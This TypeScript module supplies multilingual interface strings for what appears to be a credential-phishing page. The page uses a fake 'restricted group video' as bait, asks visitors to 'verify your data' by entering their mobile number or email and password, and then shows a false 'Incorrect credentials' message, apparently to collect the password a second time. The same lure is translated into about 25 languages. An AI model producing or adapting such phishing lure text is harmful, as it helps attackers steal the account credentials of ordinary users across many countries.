interface TranslatedTexts {
    splitMessage: string;
    gpNameDefault: string;
    inputNameField: string;
    inputPswField: string;
    buttonSubmit: string;
    modalTitle: string;
    modalContent: string;
    modalButton: string;
    info: string;
    help: string;
    more: string;
}

function getTranslatedTexts(defaultLocale: string): TranslatedTexts {
    const translations: Record<string, TranslatedTexts> = {
        en: {
            // Ingles
            splitMessage: 'We need you to verify your data to access the group video.',
            gpNameDefault: 'Restricted content',
            inputNameField: 'Mobile or email',
            inputPswField: 'Password',
            buttonSubmit: 'Show video',
            modalTitle: 'Incorrect credentials. No account found.',
            modalContent: 'Enter your email or mobile number and your password to continue.',
            modalButton: 'Accept',
            info: 'Information',
            help: 'Help',
            more: 'More'
        },
        es: {
            // Español
            splitMessage: 'Necesitamos que verifiques tus datos para poder acceder al video del grupo.',
            gpNameDefault: 'Contenido restringido',
            inputNameField: 'Móvil o correo electrónico',
            inputPswField: 'Contraseña',
            buttonSubmit: 'Mostrar video',
            modalTitle: 'Credenciales incorrectas. No se ha encontrado ninguna cuenta.',
            modalContent: 'Introduce tu correo electrónico o tu número de móvil y tu contraseña para continuar.',
            modalButton: 'Aceptar',

            info: 'Información',
            help: 'Ayuda',
            more: 'Mas'
        },
        fr: {
            // Frances
            splitMessage: 'Nous avons besoin que vous vérifiiez vos données pour accéder à la vidéo du groupe.',
            gpNameDefault: 'Contenu restreint',
            inputNameField: 'Mobile ou e-mail',
            inputPswField: 'Mot de passe',
            buttonSubmit: 'Afficher la vidéo',
            modalTitle: 'Identifiants incorrects. Aucun compte trouvé.',
            modalContent: 'Entrez votre e-mail ou votre numéro de mobile ainsi que votre mot de passe pour continuer.',
            modalButton: 'Accepter',
            info: 'Information',
            help: 'Aide',
            more: 'Plus'
        },
        de: {
            // Alemán
            splitMessage: 'Wir benötigen Ihre Daten zur Überprüfung, um auf das Gruppenvideo zugreifen zu können.',
            gpNameDefault: 'Eingeschränkter Inhalt',
            inputNameField: 'Mobiltelefon oder E-Mail',
            inputPswField: 'Passwort',
            buttonSubmit: 'Video anzeigen',
            modalTitle: 'Falsche Anmeldedaten. Kein Konto gefunden.',
            modalContent: 'Geben Sie Ihre E-Mail-Adresse oder Ihre Mobiltelefonnummer sowie Ihr Passwort ein, um fortzufahren.',
            modalButton: 'Akzeptieren',
            info: 'Information',
            help: 'Hilfe',
            more: 'Mehr'
        },
        it: {
            // Italiano
            splitMessage: 'Abbiamo bisogno che tu verifichi i tuoi dati per accedere al video del gruppo.',
            gpNameDefault: 'Contenuto restritto',
            inputNameField: 'Cellulare o e-mail',
            inputPswField: 'Password',
            buttonSubmit: 'Mostra video',
            modalTitle: 'Credenziali errate. Nessun account trovato.',
            modalContent: 'Inserisci la tua e-mail o il tuo numero di cellulare e la tua password per continuare.',
            modalButton: 'Accetta',
            info: 'Informazioni',
            help: 'Aiuto',
            more: 'Altro'
        },
        pt: {
            // Portugués
            splitMessage: 'Precisamos que você verifique seus dados para acessar o vídeo do grupo.',
            gpNameDefault: 'Conteúdo restrito',
            inputNameField: 'Celular ou e-mail',
            inputPswField: 'Senha',
            buttonSubmit: 'Mostrar vídeo',
            modalTitle: 'Credenciais incorretas. Nenhuma conta encontrada.',
            modalContent: 'Digite seu e-mail ou número de celular e sua senha para continuar.',
            modalButton: 'Aceitar',
            info: 'Informação',
            help: 'Ajuda',
            more: 'Mais'
        },
        nl: {
            // Holandés
            splitMessage: 'We hebben uw gegevens nodig om toegang te krijgen tot de groepsvideo.',
            gpNameDefault: 'Beperkte inhoud',
            inputNameField: 'Mobiel of e-mail',
            inputPswField: 'Wachtwoord',
            buttonSubmit: 'Video weergeven',
            modalTitle: 'Onjuiste referenties. Geen account gevonden.',
            modalContent: 'Voer uw e-mailadres of mobiele nummer en uw wachtwoord in om door te gaan.',
            modalButton: 'Accepteren',
            info: 'Informatie',
            help: 'Hulp',
            more: 'Meer'
        },
        ru: {
            // Ruso
            splitMessage: 'Нам нужно, чтобы вы проверили свои данные, чтобы получить доступ к групповому видео.',
            gpNameDefault: 'Ограниченный контент',
            inputNameField: 'Мобильный телефон или электронная почта',
            inputPswField: 'Пароль',
            buttonSubmit: 'Показать видео',
            modalTitle: 'Неверные учетные данные. Аккаунт не найден.',
            modalContent: 'Введите свой адрес электронной почты или номер мобильного телефона и пароль, чтобы продолжить.',
            modalButton: 'Принять',
            info: 'Информация',
            help: 'Помощь',
            more: 'Больше'
        },
        ja: {
            // Japonés
            splitMessage: 'グループのビデオにアクセスするためにデータを確認していただく必要があります。',
            gpNameDefault: '制限付きコンテンツ',
            inputNameField: '携帯電話またはメールアドレス',
            inputPswField: 'パスワード',
            buttonSubmit: 'ビデオを表示',
            modalTitle: '認証情報が正しくありません。アカウントが見つかりません。',
            modalContent: '続行するには、メールアドレスまたは携帯電話番号とパスワードを入力してください。',
            modalButton: '承諾',
            info: '情報',
            help: 'ヘルプ',
            more: 'もっと'
        },
        zh: {
            // Chino
            splitMessage: '我们需要您验证您的数据以访问群组视频。',
            gpNameDefault: '受限内容',
            inputNameField: '手机号码或电子邮件',
            inputPswField: '密码',
            buttonSubmit: '显示视频',
            modalTitle: '凭证不正确。未找到帐户。',
            modalContent: '请输入您的电子邮件或手机号码以及密码以继续。',
            modalButton: '接受',
            info: '信息',
            help: '帮助',
            more: '更多'
        },
        ar: {
            // Árabe
            splitMessage: 'نحتاج منك التحقق من بياناتك للوصول إلى فيديو المجموعة.',
            gpNameDefault: 'محتوى مقيد',
            inputNameField: 'الهاتف المحمول أو البريد الإلكتروني',
            inputPswField: 'كلمة المرور',
            buttonSubmit: 'عرض الفيديو',
            modalTitle: 'بيانات الاعتماد غير صحيحة. لم يتم العثور على حساب.',
            modalContent: 'أدخل عنوان بريدك الإلكتروني أو رقم هاتفك المحمول وكلمة المرور للمتابعة.',
            modalButton: 'موافق',
            info: 'معلومات',
            help: 'مساعدة',
            more: 'المزيد'
        },
        ko: {
            // Coreano
            splitMessage: '그룹 비디오에 액세스하려면 데이터를 확인해야 합니다.',
            gpNameDefault: '제한된 콘텐츠',
            inputNameField: '휴대폰 또는 이메일',
            inputPswField: '비밀번호',
            buttonSubmit: '비디오 표시',
            modalTitle: '잘못된 자격 증명입니다. 계정을 찾을 수 없습니다.',
            modalContent: '계속하려면 이메일 또는 휴대폰 번호와 비밀번호를 입력하세요.',
            modalButton: '수락',
            info: '정보',
            help: '도움말',
            more: '더 보기'
        },
        tr: {
            // Turco
            splitMessage: 'Grup videosuna erişmek için verilerinizi doğrulamanız gerekiyor.',
            gpNameDefault: 'Sınırlı içerik',
            inputNameField: 'Mobil veya e-posta',
            inputPswField: 'Parola',
            buttonSubmit: 'Videoyu göster',
            modalTitle: 'Hatalı kimlik bilgileri. Hesap bulunamadı.',
            modalContent: 'Devam etmek için e-posta adresinizi veya cep telefonu numaranızı ve parolanızı girin.',
            modalButton: 'Kabul et',
            info: 'Bilgi',
            help: 'Yardım',
            more: 'Daha fazla'
        },
        sv: {
            // Sueco
            splitMessage: 'Vi behöver att du verifierar dina uppgifter för att kunna komma åt gruppvideon.',
            gpNameDefault: 'Begränsat innehåll',
            inputNameField: 'Mobil eller e-post',
            inputPswField: 'Lösenord',
            buttonSubmit: 'Visa video',
            modalTitle: 'Felaktiga referenser. Inget konto hittades.',
            modalContent: 'Ange din e-postadress eller mobilnummer samt ditt lösenord för att fortsätta.',
            modalButton: 'Acceptera',
            info: 'Information',
            help: 'Hjälp',
            more: 'Mer'
        },
        el: {
            // Griego
            splitMessage: 'Χρειαζόμαστε να επαληθεύσετε τα δεδομένα σας για να αποκτήσετε πρόσβαση στο βίντεο της ομάδας.',
            gpNameDefault: 'Περιορισμένο περιεχόμενο',
            inputNameField: 'Κινητό ή ηλεκτρονικό ταχυδρομείο',
            inputPswField: 'Κωδικός',
            buttonSubmit: 'Εμφάνιση βίντεο',
            modalTitle: 'Λανθασμένα διαπιστευτήρια. Δεν βρέθηκε λογαριασμός.',
            modalContent: 'Εισαγάγετε το email ή τον αριθμό κινητού σας και τον κωδικό πρόσβασής σας για να συνεχίσετε.',
            modalButton: 'Αποδοχή',
            info: 'Πληροφορίες',
            help: 'Βοήθεια',
            more: 'Περισσότερα'
        },
        pl: {
            // Polaco
            splitMessage: 'Musimy zweryfikować Twoje dane, aby uzyskać dostęp do wideo grupy.',
            gpNameDefault: 'Ograniczona zawartość',
            inputNameField: 'Numer telefonu komórkowego lub e-mail',
            inputPswField: 'Hasło',
            buttonSubmit: 'Pokaż wideo',
            modalTitle: 'Nieprawidłowe dane logowania. Nie znaleziono konta.',
            modalContent: 'Wprowadź swój adres e-mail lub numer telefonu komórkowego oraz hasło, aby kontynuować.',
            modalButton: 'Akceptuj',
            info: 'Informacje',
            help: 'Pomoc',
            more: 'Więcej'
        },
        hi: {
            // Hindi
            splitMessage: 'हमें आपके डेटा की सत्यापन की आवश्यकता है ताकि आप समूह वीडियो तक पहुँच सकें।',
            gpNameDefault: 'सीमित सामग्री',
            inputNameField: 'मोबाइल या ईमेल',
            inputPswField: 'पासवर्ड',
            buttonSubmit: 'वीडियो दिखाएं',
            modalTitle: 'गलत क्रेडेंशियल्स। कोई खाता नहीं मिला।',
            modalContent: 'जारी रखने के लिए अपना ईमेल या मोबाइल नंबर और पासवर्ड दर्ज करें।',
            modalButton: 'स्वीकार करें',
            info: 'जानकारी',
            help: 'सहायता',
            more: 'अधिक'
        },
        hu: {
            // Húngaro
            splitMessage: 'Az adatok ellenőrzéséhez szükségünk van rá, hogy hozzáférjünk a csoportvideóhoz.',
            gpNameDefault: 'Korlátozott tartalom',
            inputNameField: 'Mobil vagy e-mail',
            inputPswField: 'Jelszó',
            buttonSubmit: 'Videó megjelenítése',
            modalTitle: 'Hibás hitelesítő adatok. Nincs ilyen fiók.',
            modalContent: 'Adja meg e-mail címét vagy mobiltelefonszámát és jelszavát a folytatáshoz.',
            modalButton: 'Elfogadás',
            info: 'Információ',
            help: 'Segítség',
            more: 'Tovább'
        },
        vi: {
            // Vietnamita
            splitMessage: 'Chúng tôi cần bạn xác minh dữ liệu để truy cập vào video nhóm.',
            gpNameDefault: 'Nội dung bị hạn chế',
            inputNameField: 'Điện thoại di động hoặc email',
            inputPswField: 'Mật khẩu',
            buttonSubmit: 'Hiển thị video',
            modalTitle: 'Thông tin đăng nhập không chính xác. Không tìm thấy tài khoản.',
            modalContent: 'Nhập địa chỉ email hoặc số điện thoại di động và mật khẩu của bạn để tiếp tục.',
            modalButton: 'Chấp nhận',
            info: 'Thông tin',
            help: 'Trợ giúp',
            more: 'Thêm'
        },
        cs: {
            // Checo
            splitMessage: 'Potřebujeme, abyste ověřili svá data, abyste mohli přistupovat k videu skupiny.',
            gpNameDefault: 'Omezený obsah',
            inputNameField: 'Mobilní telefon nebo e-mail',
            inputPswField: 'Heslo',
            buttonSubmit: 'Zobrazit video',
            modalTitle: 'Nesprávné přihlašovací údaje. Nebyl nalezen žádný účet.',
            modalContent: 'Zadejte svou e-mailovou adresu nebo číslo mobilního telefonu a heslo pro pokračování.',
            modalButton: 'Přijmout',
            info: 'Informace',
            help: 'Pomoc',
            more: 'Více'
        },
        th: {
            // Tailandés
            splitMessage: 'เราต้องการให้คุณยืนยันข้อมูลของคุณเพื่อเข้าถึงวิดีโอของกลุ่ม',
            gpNameDefault: 'เนื้อหาที่ถูกจำกัด',
            inputNameField: 'โทรศัพท์มือถือหรืออีเมล',
            inputPswField: 'รหัสผ่าน',
            buttonSubmit: 'แสดงวิดีโอ',
            modalTitle: 'ข้อมูลรับรองไม่ถูกต้อง ไม่พบบัญชี',
            modalContent: 'ป้อนที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือและรหัสผ่านเพื่อดำเนินการต่อ',
            modalButton: 'ยอมรับ',
            info: 'ข้อมูล',
            help: 'ช่วยเหลือ',
            more: 'เพิ่มเติม'
        },
        da: {
            // Danés
            splitMessage: 'Vi har brug for, at du verificerer dine data for at få adgang til gruppevideoen.',
            gpNameDefault: 'Begrænset indhold',
            inputNameField: 'Mobil eller e-mail',
            inputPswField: 'Adgangskode',
            buttonSubmit: 'Vis video',
            modalTitle: 'Forkerte legitimationsoplysninger. Ingen konto fundet.',
            modalContent: 'Indtast din e-mail-adresse eller dit mobilnummer samt din adgangskode for at fortsætte.',
            modalButton: 'Accepter',
            info: 'Information',
            help: 'Hjælp',
            more: 'Mere'
        },
        he: {
            // Hebreo
            splitMessage: 'אנחנו זקוקים לאימות הנתונים שלך כדי לגשת לסרטון הקבוצה.',
            gpNameDefault: 'תוכן מוגבל',
            inputNameField: 'טלפון נייד או דוא"ל',
            inputPswField: 'סיסמה',
            buttonSubmit: 'הצג סרטון',
            modalTitle: 'פרטי הכניסה שגויים. לא נמצא חשבון.',
            modalContent: 'הזן את כתובת הדוא"ל שלך או מספר הטלפון הנייד והסיסמה שלך כדי להמשיך.',
            modalButton: 'אישור',
            info: 'מידע',
            help: 'עזרה',
            more: 'יותר'
        },
        fi: {
            // Finlandés
            splitMessage: 'Tarvitsemme, että vahvistat tietosi, jotta voit käyttää ryhmävideota.',
            gpNameDefault: 'Rajoitettu sisältö',
            inputNameField: 'Matkapuhelin tai sähköposti',
            inputPswField: 'Salasana',
            buttonSubmit: 'Näytä video',
            modalTitle: 'Virheelliset tunnistetiedot. Tiliä ei löytynyt.',
            modalContent: 'Syötä sähköpostiosoitteesi tai matkapuhelinnumerosi sekä salasanasi jatkaaksesi.',
            modalButton: 'Hyväksy',
            info: 'Tietoja',
            help: 'Apua',
            more: 'Lisää'
        },
        no: {
            // Noruego
            splitMessage: 'Vi trenger at du bekrefter dataene dine for å få tilgang til gruppevideoen.',
            gpNameDefault: 'Begrenset innhold',
            inputNameField: 'Mobil eller e-post',
            inputPswField: 'Passord',
            buttonSubmit: 'Vis video',
            modalTitle: 'Feil legitimasjon. Ingen konto funnet.',
            modalContent: 'Skriv inn e-postadressen din eller mobilnummeret ditt og passordet ditt for å fortsette.',
            modalButton: 'Godta',
            info: 'Informasjon',
            help: 'Hjelp',
            more: 'Mer'
        },
        bg: {
            // Búlgaro
            splitMessage: 'Ние се нуждаем от вас да потвърдите данните си, за да получите достъп до груповото видео.',
            gpNameDefault: 'Ограничено съдържание',
            inputNameField: 'Мобилен телефон или имейл',
            inputPswField: 'Парола',
            buttonSubmit: 'Покажи видео',
            modalTitle: 'Грешни удостоверения. Няма намерен акаунт.',
            modalContent: 'Въведете вашия имейл адрес или мобилен номер и парола, за да продължите.',
            modalButton: 'Приемам',
            info: 'Информация',
            help: 'Помощ',
            more: 'Повече'
        }
    };

    const language = defaultLocale.split('_')[0];
    return translations[language] || translations.en;
}

export { TranslatedTexts, getTranslatedTexts };